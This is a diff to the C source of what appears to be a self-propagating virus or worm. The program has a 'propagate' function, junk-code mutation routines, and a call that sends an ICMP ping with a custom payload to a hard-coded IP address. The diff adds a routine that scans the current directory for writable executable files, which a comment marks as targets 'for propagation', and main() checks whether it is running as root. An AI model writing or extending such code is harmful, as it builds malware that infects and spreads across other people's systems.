@@ -3,6 +3,10 @@
 #include <string.h>
 #include <ctype.h>
 #include <time.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <errno.h>
 
 #define PUSH 0x50
 #define POP 0x58
@@ -206,11 +210,44 @@ void propagate()
 
 }
 
+// Lists files in passed in directory path
+void list_files(const char *path) {
+DIR *dir;
+    struct dirent *ent;
+
+    /* Open directory stream */
+    dir = opendir ("./");
+    if (dir != NULL) {
+
+        /* Print all files and directories within the directory */
+        while ((ent = readdir (dir)) != NULL) {
+            // regular files only - no DT_DIR (directories) or DT_LNK (links)
+            if (ent->d_type == DT_REG)
+            {
+                printf("%s", ent->d_name);
+                if (access(ent->d_name, X_OK) == 0 && access(ent->d_name, W_OK) == 0)
+                {
+                    printf(" - Writable Executable");
+                }
+                printf("\n");
+            }
+        }
+
+        closedir (dir);
+
+    } else {
+        /* Could not open directory */
+        fprintf (stderr, "Cannot open %s (%s)\n", "./", strerror (errno));
+        exit (EXIT_FAILURE);
+    }
+}
+
 // Should check before executing if root privelege
 int main(int argc, char* argv[])
 {
     system("id -u"); // outputs 0 if root user
-    execute("192.168.1.142"); // send ICMP ping with custom payload to IP
+    //execute("192.168.1.142"); // send ICMP ping with custom payload to IP
+    list_files("./"); // list writable executable files for propagation
 
     //readcode(argv[0]);  JUNK;
     //replacejunk();      JUNK;
